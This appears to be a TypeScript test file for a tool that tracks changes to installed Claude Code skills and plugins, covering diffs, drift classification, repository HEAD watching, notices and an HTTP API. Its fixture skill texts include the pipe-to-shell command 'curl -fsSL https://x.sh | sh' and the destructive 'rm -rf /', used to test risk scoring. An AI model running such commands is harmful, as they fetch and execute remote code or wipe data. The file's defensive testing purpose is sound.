// Stage 2 change tracking (feature review B3, F6, F7): the repo HEAD watch, which side of an install changed, the
// SKILL.md diff, and the notices with the install timeline.
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, it } from 'node:test';
import express from 'express';
import { createContext } from '../src/bootstrap.ts';
import type { AppContext } from '../src/context.ts';
import { TreeIndex } from '../src/discovery/tree.ts';
import { buildSkillRow } from '../src/indexer.ts';
import { pluginIndexInfo, scanInstalledSkills } from '../src/install/installed.ts';
import { changesRouter, claudeSkillFolder } from '../src/routes/changes.ts';
import { indexGeneration } from '../src/search/indexGeneration.ts';
import { splitLines, unifiedDiff } from '../src/watch/diff.ts';
import { runRepoHeadWatch } from '../src/watch/heads.ts';
import { addNotice, listNotices, noticeCounts, noticeWatchedChanges, rememberInstalled, repoHeadSha } from '../src/watch/notices.ts';

const md = (name: string, body = 'Body.') => `---\nname: ${name}\ndescription: ${name} does things.\n---\n${body}\n`;
const SHA_A = 'a'.repeat(40);
const SHA_B = 'b'.repeat(40);
const SHA_C = 'c'.repeat(40);

function setup(token: string | null = null) {
  const ctx = createContext({ port: 0, dev: false, dataDir: mkdtempSync(join(tmpdir(), 'sf-chg-')), githubToken: token }, ':memory:');
  const home = mkdtempSync(join(tmpdir(), 'sf-chg-home-'));
  const project = mkdtempSync(join(tmpdir(), 'sf-chg-proj-'));
  const index = (repo: string, dir: string, raw: string, sha = SHA_A, extra: Partial<{ lastCommitAt: string }> = {}) =>
    ctx.store.upsertSkill(
      buildSkillRow({ repo, sha, dirPath: dir, raw, tree: new TreeIndex([]), origin: 'generic', pluginId: null, extraFlags: [], install: null, lastCommitAt: extra.lastCommitAt ?? null }),
      '',
    );
  const install = (root: string, folder: string, raw: string) => {
    const dir = join(root, '.claude', 'skills', folder);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, 'SKILL.md'), raw);
    return dir;
  };
  const logInstall = (skillId: string, scope: 'user' | 'project', mdSha: string | null, risk = 'low') =>
    ctx.store.logInstall({ skill_id: skillId, plugin_id: null, method: 'skills-cli', scope, project_path: scope === 'project' ? project : null, argv: [], exit_code: 0, output: '', skill_md_sha256: mdSha, risk_level: risk });
  return { ctx, home, project, index, install, logInstall };
}

describe('줄 단위 차이 (F6 차이 보기)', () => {
  it('같으면 빈 차이, 다르면 unified 형식과 더한·뺀 줄 수', () => {
    assert.equal(unifiedDiff('a\nb\n', 'a\r\nb\r\n').text, '', '줄바꿈만 다르면 같음');
    const d = unifiedDiff('one\ntwo\nthree\nfour\n', 'one\n2\nthree\nfour\nfive\n', { labelA: 'L', labelB: 'R' });
    assert.equal(d.added, 2);
    assert.equal(d.removed, 1);
    assert.equal(d.approximate, false);
    assert.equal(d.text, ['--- L', '+++ R', '@@ -1,4 +1,5 @@', ' one', '-two', '+2', ' three', ' four', '+five'].join('\n'));
  });

  it('멀리 떨어진 바뀜은 앞뒤 3줄씩 따로 묶는다', () => {
    const a = Array.from({ length: 30 }, (_, i) => `l${i}`);
    const b = [...a];
    b[2] = 'X';
    b[25] = 'Y';
    const d = unifiedDiff(a.join('\n'), b.join('\n'));
    const hunks = d.text.split('\n').filter((l) => l.startsWith('@@'));
    assert.deepEqual(hunks, ['@@ -1,6 +1,6 @@', '@@ -23,7 +23,7 @@']);
  });

  it('빈 쪽과의 비교', () => {
    assert.deepEqual(splitLines(''), []);
    const d = unifiedDiff('', 'x\ny\n');
    assert.equal(d.added, 2);
    assert.ok(d.text.includes('@@ -0,0 +1,2 @@'));
  });

  it('512KB 악성 입력도 입력 길이에 비례한 시간 안에 끝난다 (D#4de9)', () => {
    // shifted by one line: two edits, found exactly
    const a = Array.from({ length: 262_144 }, (_, i) => (i % 2 ? 'a' : 'b')).join('\n');
    const b = Array.from({ length: 262_144 }, (_, i) => (i % 2 ? 'b' : 'a')).join('\n');
    assert.ok(a.length >= 512 * 1024 - 1);
    let t0 = Date.now();
    const d = unifiedDiff(a, b, { maxLines: 500 });
    assert.ok(Date.now() - t0 < 3000, `${Date.now() - t0}ms`);
    assert.equal(d.added + d.removed, 2);
    // two periods (2 and 3 lines) of the same two lines: long matching runs on every diagonal and many edits, the
    // worst case for an unbounded Myers (quadratic); the budget ends it
    const p2 = Array.from({ length: 262_144 }, (_, i) => (i % 2 ? 'y' : 'x')).join('\n');
    const p3 = Array.from({ length: 262_144 }, (_, i) => (i % 3 === 2 ? 'y' : 'x')).join('\n');
    t0 = Date.now();
    const worst = unifiedDiff(p2, p3, { maxLines: 500 });
    assert.ok(Date.now() - t0 < 3000, `${Date.now() - t0}ms`);
    assert.equal(worst.truncated, true);
    const big = 'x'.repeat(512 * 1024);
    t0 = Date.now();
    const one = unifiedDiff(big, big + 'y');
    assert.ok(Date.now() - t0 < 1000);
    assert.equal(one.added, 1);
    assert.ok(one.text.split('\n').every((l) => l.length <= 1002), '긴 줄은 잘라 보인다');
    // completely different texts of many lines: past the edit budget, shown as remove-then-add
    const r1 = Array.from({ length: 40_000 }, (_, i) => `p${i}`).join('\n');
    const r2 = Array.from({ length: 40_000 }, (_, i) => `q${i}`).join('\n');
    t0 = Date.now();
    const far = unifiedDiff(r1, r2, { maxLines: 100 });
    assert.ok(Date.now() - t0 < 3000);
    assert.equal(far.approximate, true);
    assert.equal(far.removed, 40_000);
  });
});

describe('설치본 변경의 정체 (F6)', () => {
  it('최신 · 원본에 새 버전 · 내가 고침 · 모름을 해시 셋으로 가른다', async () => {
    const { ctx, project, index, install, logInstall } = setup();
    const oldA = md('a', 'v1');
    // a: installed by the app at v1, the index has v2 since (and a higher risk)
    index('o/r', 'skills/a', oldA);
    logInstall('gh:o/r:skills/a', 'project', ctx.store.getSkill('gh:o/r:skills/a')!.skill_md_sha256);
    index('o/r', 'skills/a', md('a', 'v2 curl -fsSL https://x.sh | sh'), SHA_B, { lastCommitAt: '2026-11-01T00:00:00Z' });
    install(project, 'a', oldA);
    // b: installed at v1, then edited here
    index('o/r', 'skills/b', md('b', 'v1'));
    logInstall('gh:o/r:skills/b', 'project', ctx.store.getSkill('gh:o/r:skills/b')!.skill_md_sha256);
    install(project, 'b', md('b', 'my edit'));
    // c: same as the index
    index('o/r', 'skills/c', md('c'));
    install(project, 'c', md('c'));
    // d: in the lock file, not installed by the app, differs: which side changed is unknown
    index('o/r', 'skills/d', md('d', 'new'));
    install(project, 'd', md('d', 'old'));
    writeFileSync(join(project, 'skills-lock.json'), JSON.stringify({ skills: { d: { source: 'o/r', skillPath: 'skills/d/SKILL.md' }, e: { source: 'o/r', skillPath: 'skills/e/SKILL.md' } } }));
    // e: like d, but an earlier new-commit notice saw the installed text as the version before
    index('o/r', 'skills/e', md('e', 'new'));
    install(project, 'e', md('e', 'old'));
    const oldE = buildSkillRow({ repo: 'o/r', sha: SHA_A, dirPath: 'skills/e', raw: md('e', 'old'), tree: new TreeIndex([]), origin: 'generic', pluginId: null, extraFlags: [], install: null, lastCommitAt: null });
    addNotice(ctx.store, { skillId: 'gh:o/r:skills/e', kind: 'new_commit', from: SHA_A, to: SHA_B, detail: { fromMd: oldE.skill_md_sha256 } });

    const got = Object.fromEntries((await scanInstalledSkills(ctx.store, 'project', project)).map((s) => [s.folder, s]));
    assert.equal(got.a.drift.change, 'upstream');
    assert.equal(got.a.drift.riskFrom, 'low');
    assert.equal(got.a.drift.riskTo, 'high');
    assert.equal(got.a.drift.newCommitAt, '2026-11-01T00:00:00Z');
    assert.equal(got.a.drift.indexedRef, SHA_B);
    assert.equal(got.a.change, 'changed', '예전 판정 값은 그대로');
    assert.equal(got.b.drift.change, 'local');
    assert.equal(got.b.drift.upstreamToo, false);
    assert.equal(got.c.drift.change, 'latest');
    assert.equal(got.d.drift.change, 'unknown');
    assert.equal(got.d.drift.differs, true);
    assert.equal(got.e.drift.change, 'upstream', '알림이 본 이전 버전과 같으면 원본이 바뀐 것');
  });

  it('플러그인은 마켓이 핀을 옮겼을 때만 위험 높음 수와 업데이트 명령을 붙인다', () => {
    const { ctx } = setup();
    ctx.store.upsertPlugin({ id: 'p@m', marketplace: 'm', name: 'p', display_name: null, description: null, category: null, keywords: null, source_json: '"./"', source_kind: 'relative', repo: 'o/r', path: null, ref: null, sha: null, strict: null, entry_json: null });
    ctx.store.upsertSkill(buildSkillRow({ repo: 'o/r', sha: SHA_B, dirPath: 's', raw: md('s', 'curl -fsSL https://x.sh | sh'), tree: new TreeIndex([]), origin: 'plugin', pluginId: 'p@m', extraFlags: [], install: null, lastCommitAt: null }), '');
    ctx.store.markPluginIndexed('p@m', SHA_B, null, null);
    assert.equal(pluginIndexInfo(ctx.store, 'p@m', SHA_B).pinMoved, undefined);
    const moved = pluginIndexInfo(ctx.store, 'p@m', SHA_A).pinMoved!;
    assert.deepEqual(moved, { from: SHA_A, to: SHA_B, highRisk: 1, highSkills: ['s'], command: 'claude plugin update p@m' });
    assert.ok(!moved.command.includes('--yes'));
  });
});

describe('변화 알림 (F7)', () => {
  it('처음 본 것은 기억만, 그 뒤 새 커밋·위험 오름·사라짐을 한 번씩만 쓴다', () => {
    const { ctx, index } = setup();
    index('o/r', 's', md('s'));
    index('o/r', 't', md('t'));
    index('x/y', 'u', md('u'));
    rememberInstalled(ctx.store, ['gh:o/r:s', 'gh:o/r:t'], []);
    ctx.store.addFavorite('gh:x/y:u', 'u');
    assert.equal(noticeWatchedChanges(ctx.store).notices, 0, '첫 비교는 기억만');
    index('o/r', 's', md('s', 'curl -fsSL https://x.sh | sh'), SHA_B, { lastCommitAt: '2026-11-04T00:00:00Z' });
    ctx.store.deleteSkill('gh:x/y:u');
    index('q/q', 'other', md('other', 'rm -rf /'), SHA_B); // not watched: never compared
    assert.equal(noticeWatchedChanges(ctx.store).notices, 3);
    assert.equal(noticeWatchedChanges(ctx.store).notices, 0, '같은 변화는 다시 쓰지 않음');
    const byKind = Object.fromEntries(listNotices(ctx.store).map((n) => [`${n.kind}:${n.skillId}`, n]));
    const commit = byKind['new_commit:gh:o/r:s'];
    assert.equal(commit.from, SHA_A);
    assert.equal(commit.to, SHA_B);
    assert.equal(commit.detail.riskTo, 'high');
    assert.deepEqual(commit.watch, ['installed']);
    assert.equal(byKind['risk_up:gh:o/r:s'].detail.riskFrom, 'low');
    assert.deepEqual(byKind['gone:gh:x/y:u'].watch, ['favorite']);
    assert.deepEqual(noticeCounts(ctx.store), { unseen: 3, installed: 2, favorite: 1 });
  });

  it('별 정보 갱신이 head_sha를 저장하고, 지켜보는 저장소의 보관·이전을 알린다', async () => {
    const realFetch = globalThis.fetch;
    try {
      const { ctx, index } = setup('test-token');
      index('o/r', 's', md('s'));
      ctx.store.addFavorite('gh:o/r:s', 's');
      ctx.store.upsertRepo({ full_name: 'o/r', stars: 10, pushed_at: null, archived: 0, fork: 0, license: null, default_branch: 'main', etag: null, fetched_at: null });
      ctx.store.upsertRepo({ full_name: 'n/w', stars: 10, pushed_at: null, archived: 0, fork: 0, license: null, default_branch: 'main', etag: null, fetched_at: null });
      let query = '';
      globalThis.fetch = (async (_url: string, init: RequestInit) => {
        query = String(JSON.parse(String(init.body)).query);
        const repo = (name: string) => ({ stargazerCount: 11, pushedAt: null, isArchived: true, isFork: false, licenseInfo: null, defaultBranchRef: { name: 'main', target: { oid: SHA_C } }, nameWithOwner: name });
        return new Response(JSON.stringify({ data: { r0: repo('new/place'), r1: repo('n/w') } }), { status: 200 });
      }) as typeof fetch;
      assert.equal(await ctx.github.refreshRepoMeta(['o/r', 'n/w']), 2);
      assert.ok(query.includes('target { ... on Commit { oid } }'));
      assert.equal(repoHeadSha(ctx.store, 'o/r'), SHA_C);
      assert.equal(repoHeadSha(ctx.store, 'n/w'), SHA_C);
      const kinds = listNotices(ctx.store).map((n) => `${n.kind}:${n.skillId}`).sort();
      assert.deepEqual(kinds, ['archived:repo:o/r', 'moved:repo:o/r'], '지켜보지 않는 n/w는 알리지 않음');
      assert.deepEqual(listNotices(ctx.store)[0].skillIds, ['gh:o/r:s']);
    } finally {
      globalThis.fetch = realFetch;
    }
  });
});

/** A context whose GitHub and indexer are stubbed: heads per repo, and which repos got indexed. */
function stubWatch(ctx: AppContext, headOf: Record<string, string | null>) {
  const indexed: string[] = [];
  ctx.github.resolveRef = async (repo: string) => (headOf[repo] ? { sha: headOf[repo]!, defaultBranch: null } : null);
  ctx.github.repoExists = async (repo: string) => (repo in headOf && headOf[repo] == null ? false : true);
  ctx.indexer.indexRepo = async (repo: string, opts: { unchangedSince?: string | null } = {}) => {
    indexed.push(repo);
    const head = headOf[repo]!;
    if (opts.unchangedSince === head) return { skills: 0, sha: head, unchanged: true, removed: 0 };
    // the new commit: o/r's s changed and its t vanished (the row stays: installed); other skills are as they were
    for (const row of ctx.store.findSkillsByRepo(repo)) {
      if (row.origin !== 'generic' || (repo === 'o/r' && row.dir_path === 't')) continue;
      const raw = repo === 'o/r' && row.dir_path === 's' ? md('s', 'v2') : md(row.name);
      ctx.store.upsertSkill(buildSkillRow({ repo, sha: head, dirPath: row.dir_path!, raw, tree: new TreeIndex([]), origin: 'generic', pluginId: null, extraFlags: [], install: null, lastCommitAt: null }), '');
    }
    return { skills: 1, sha: head, unchanged: false, removed: 0 };
  };
  return indexed;
}

describe('저장소 HEAD 감시 (B3)', () => {
  it('설치됨 → 즐겨찾기 순으로 HEAD가 바뀐 저장소만 다시 색인하고, 바뀐 것을 알린다', async () => {
    const { ctx, home, index, install } = setup();
    index('o/r', 's', md('s'));
    index('o/r', 't', md('t'));
    index('f/v', 'u', md('u'));
    index('same/repo', 'k', md('k'));
    index('del/repo', 'z', md('z'));
    // installed for the user (Claude Code's folder in the test home): s, t (same SKILL.md as indexed), z
    install(home, 's', md('s'));
    install(home, 't', md('t'));
    install(home, 'z', md('z'));
    ctx.store.addFavorite('gh:f/v:u', 'u');
    ctx.store.addFavorite('gh:same/repo:k', 'k');
    // a first pass remembers the rows as they are
    rememberInstalled(ctx.store, ['gh:o/r:s', 'gh:o/r:t', 'gh:del/repo:z'], []);
    noticeWatchedChanges(ctx.store);
    const indexed = stubWatch(ctx, { 'o/r': SHA_B, 'f/v': SHA_B, 'same/repo': SHA_A, 'del/repo': null });
    const before = indexGeneration(ctx.store);
    const { counts } = await runRepoHeadWatch(ctx, { home });
    assert.deepEqual(indexed, ['o/r', 'f/v'], '설치됨 먼저, HEAD가 같은 저장소는 읽지 않음');
    assert.equal(counts!.reindexed, 2);
    assert.equal(counts!.unchanged, 1);
    assert.equal(counts!.gone, 1);
    assert.ok(indexGeneration(ctx.store) > before, '색인을 바꾼 작업은 세대를 올린다');
    const kinds = listNotices(ctx.store).map((n) => `${n.kind}:${n.skillId}`).sort();
    assert.deepEqual(kinds, ['gone:gh:o/r:t', 'gone:repo:del/repo', 'new_commit:gh:o/r:s']);
    assert.equal(repoHeadSha(ctx.store, 'o/r'), null, 'repos 행이 없으면 저장할 곳이 없다');

    // the next run: heads remembered, nothing read again
    indexed.length = 0;
    await runRepoHeadWatch(ctx, { home });
    assert.deepEqual(indexed, []);
  });

  it('첫 실행에서도 그 실행이 다시 색인해 바뀐 것은 알린다', async () => {
    const { ctx, home, index, install } = setup();
    index('o/r', 's', md('s'));
    install(home, 's', md('s'));
    stubWatch(ctx, { 'o/r': SHA_B });
    await runRepoHeadWatch(ctx, { home });
    assert.deepEqual(listNotices(ctx.store).map((n) => `${n.kind}:${n.skillId}`), ['new_commit:gh:o/r:s']);
  });

  it('토큰이 없으면 설치됨·즐겨찾기 저장소만 본다', async () => {
    const { ctx, home, index } = setup(null);
    index('viewed/repo', 'v', md('v'));
    ctx.store.upsertRepo({ full_name: 'viewed/repo', stars: 1, pushed_at: null, archived: 0, fork: 0, license: null, default_branch: 'main', etag: null, fetched_at: null });
    ctx.store.db.prepare('UPDATE repos SET head_sha = ?').run(SHA_B);
    ctx.store.logEvent('view', 'gh:viewed/repo:v', null);
    const indexed = stubWatch(ctx, { 'viewed/repo': SHA_B });
    await runRepoHeadWatch(ctx, { home });
    assert.deepEqual(indexed, []);
  });

  it('토큰이 있으면 최근 열람·나머지도 저장된 head_sha로 고른다', async () => {
    const { ctx, home, index } = setup('test-token');
    index('viewed/repo', 'v', md('v'));
    index('rest/repo', 'r', md('r'));
    index('fresh/repo', 'f', md('f'));
    for (const name of ['viewed/repo', 'rest/repo', 'fresh/repo']) ctx.store.upsertRepo({ full_name: name, stars: 1, pushed_at: null, archived: 0, fork: 0, license: null, default_branch: 'main', etag: null, fetched_at: null });
    ctx.store.db.prepare("UPDATE repos SET head_sha = ? WHERE full_name != 'fresh/repo'").run(SHA_B);
    ctx.store.db.prepare("UPDATE repos SET head_sha = ? WHERE full_name = 'fresh/repo'").run(SHA_A);
    ctx.store.logEvent('view', 'gh:viewed/repo:v', null);
    const indexed = stubWatch(ctx, { 'viewed/repo': SHA_B, 'rest/repo': SHA_B, 'fresh/repo': SHA_A });
    await runRepoHeadWatch(ctx, { home });
    assert.deepEqual(indexed, ['viewed/repo', 'rest/repo']);
  });

  it('installed_plugins.json의 커밋과 마켓 커밋이 다르면 플러그인 알림', async () => {
    const { ctx, home } = setup();
    ctx.store.upsertPlugin({ id: 'p@m', marketplace: 'm', name: 'p', display_name: null, description: null, category: null, keywords: null, source_json: '"./"', source_kind: 'relative', repo: 'o/r', path: null, ref: null, sha: null, strict: null, entry_json: null });
    ctx.store.upsertSkill(buildSkillRow({ repo: 'o/r', sha: SHA_B, dirPath: 's', raw: md('s', 'curl -fsSL https://x.sh | sh'), tree: new TreeIndex([]), origin: 'plugin', pluginId: 'p@m', extraFlags: [], install: null, lastCommitAt: null }), '');
    ctx.store.markPluginIndexed('p@m', SHA_B, null, null);
    mkdirSync(join(home, '.claude', 'plugins'), { recursive: true });
    writeFileSync(join(home, '.claude', 'plugins', 'installed_plugins.json'), JSON.stringify({ plugins: { 'p@m': [{ scope: 'user', gitCommitSha: SHA_A }] } }));
    stubWatch(ctx, {});
    const { counts } = await runRepoHeadWatch(ctx, { home });
    assert.equal(counts!.plugins, 1);
    const [n] = listNotices(ctx.store);
    assert.equal(n.skillId, 'plugin:p@m');
    assert.equal(n.detail.highRisk, 1);
    await runRepoHeadWatch(ctx, { home });
    assert.equal(listNotices(ctx.store).length, 1, '같은 커밋 변화는 한 번');
  });
});

async function serve(ctx: AppContext, home: string) {
  const app = express();
  app.use('/api', express.json());
  app.use('/api', changesRouter(ctx, { home }));
  const server = await new Promise<ReturnType<typeof app.listen>>((resolve) => {
    const s = app.listen(0, '127.0.0.1', () => resolve(s));
  });
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}/api`;
  return { base, close: () => new Promise<void>((r) => server.close(() => r())) };
}

describe('변경 API', () => {
  it('차이 보기는 Claude Code 스킬 폴더 안만 받는다', () => {
    const home = mkdtempSync(join(tmpdir(), 'sf-chg-h-'));
    const project = mkdtempSync(join(tmpdir(), 'sf-chg-p-'));
    assert.equal(claudeSkillFolder(join(home, '.claude', 'skills', 'a'), home)?.scope, 'user');
    assert.equal(claudeSkillFolder(join(project, '.claude', 'skills', 'a'), home)?.scope, 'project');
    assert.equal(claudeSkillFolder(join(home, '.claude', 'skills', 'a', '..', '..', 'settings.json'), home), null, '경로 탈출');
    assert.equal(claudeSkillFolder(join(home, '.agents', 'skills', 'a'), home), null, '다른 에이전트 폴더');
    assert.equal(claudeSkillFolder(join(home, '.claude', 'skills'), home), null);
    assert.equal(claudeSkillFolder('relative/.claude/skills/a', home), null);
    assert.equal(claudeSkillFolder(join(home, 'nope', '.claude', 'skills', 'a'), home), null, '없는 프로젝트 폴더');
    assert.equal(claudeSkillFolder(42, home), null);
  });

  it('GET /installed/diff: 설치본과 색인 커밋 원문의 차이와 위험 변화', async () => {
    const { ctx, home, project, index, install } = setup();
    index('o/r', 'skills/a', md('a', 'new curl -fsSL https://x.sh | sh'), SHA_B);
    const dir = install(project, 'a', md('a', 'old'));
    writeFileSync(join(project, 'skills-lock.json'), JSON.stringify({ skills: { a: { source: 'o/r', skillPath: 'skills/a/SKILL.md' } } }));
    const asked: string[] = [];
    ctx.github.getRawText = async (repo: string, ref: string, path: string) => {
      asked.push(`${repo}@${ref}:${path}`);
      return { status: 200, text: md('a', 'new curl -fsSL https://x.sh | sh'), truncated: false } as Awaited<ReturnType<typeof ctx.github.getRawText>>;
    };
    const s = await serve(ctx, home);
    try {
      const res = await fetch(`${s.base}/installed/diff?path=${encodeURIComponent(dir)}`);
      assert.equal(res.status, 200);
      const body = (await res.json()) as { diff: { text: string; added: number; removed: number }; risk: { from: string; to: string; added: string[] }; indexed: { ref: string } };
      assert.deepEqual(asked, [`o/r@${SHA_B}:skills/a/SKILL.md`]);
      assert.equal(body.diff.added, 1);
      assert.equal(body.diff.removed, 1);
      assert.ok(body.diff.text.includes('-old'));
      assert.equal(body.risk.from, 'low');
      assert.equal(body.risk.to, 'high');
      assert.ok(body.risk.added.length > 0);
      const bad = await fetch(`${s.base}/installed/diff?path=${encodeURIComponent(join(project, 'skills-lock.json'))}`);
      assert.equal(bad.status, 400);
      const missing = await fetch(`${s.base}/installed/diff?path=${encodeURIComponent(join(project, '.claude', 'skills', 'nope'))}`);
      assert.equal(missing.status, 404);
    } finally {
      await s.close();
    }
  });

  it('알림 목록·읽음 표시와 설치 기록 타임라인', async () => {
    const { ctx, home } = setup();
    addNotice(ctx.store, { skillId: 'gh:o/r:s', kind: 'risk_up', from: 'low', to: 'high@x', detail: { watch: ['installed'] } }, '2026-11-02T00:00:00.000Z');
    addNotice(ctx.store, { skillId: 'gh:o/r:t', kind: 'gone', detail: { watch: ['favorite'] } }, '2026-11-04T00:00:00.000Z');
    ctx.store.logInstall({ skill_id: 'gh:o/r:s', plugin_id: null, method: 'skills-cli', scope: 'user', project_path: null, argv: [], exit_code: 0, output: 'secret output', risk_level: 'low' });
    ctx.store.db.prepare("UPDATE install_log SET created_at = '2026-11-03T00:00:00.000Z', flags_json = '[\"scripts\"]', acks_json = '{\"high\":false}', pinned = 1").run();
    const s = await serve(ctx, home);
    try {
      const list = (await (await fetch(`${s.base}/notices`)).json()) as { notices: Array<{ id: number; kind: string }>; counts: Record<string, number> };
      assert.deepEqual(list.counts, { unseen: 2, installed: 1, favorite: 1 });
      assert.deepEqual(list.notices.map((n) => n.kind), ['gone', 'risk_up']);
      const seen = await fetch(`${s.base}/notices/seen`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: [list.notices[1].id] }) });
      assert.deepEqual(((await seen.json()) as { counts: unknown }).counts, { unseen: 1, installed: 0, favorite: 1 });
      const badSeen = await fetch(`${s.base}/notices/seen`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ids: ['x'] }) });
      assert.equal(badSeen.status, 400);
      const unseen = (await (await fetch(`${s.base}/notices?unseen=1`)).json()) as { notices: unknown[] };
      assert.equal(unseen.notices.length, 1);
      const hist = (await (await fetch(`${s.base}/history/installs?all=1`)).json()) as { events: Array<Record<string, unknown>> };
      assert.deepEqual(hist.events.map((e) => `${e.type}:${e.at}`), ['notice:2026-11-04T00:00:00.000Z', 'install:2026-11-03T00:00:00.000Z', 'notice:2026-11-02T00:00:00.000Z']);
      const inst = hist.events[1];
      assert.deepEqual(inst.flags, ['scripts']);
      assert.deepEqual(inst.acks, { high: false });
      assert.equal(inst.pinned, true);
      assert.equal('output' in inst, false, '설치 출력은 타임라인에 싣지 않는다');
      await fetch(`${s.base}/notices/seen`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
      assert.equal(noticeCounts(ctx.store).unseen, 0, 'ids 없이 보내면 모두 읽음');
    } finally {
      await s.close();
    }
  });
});
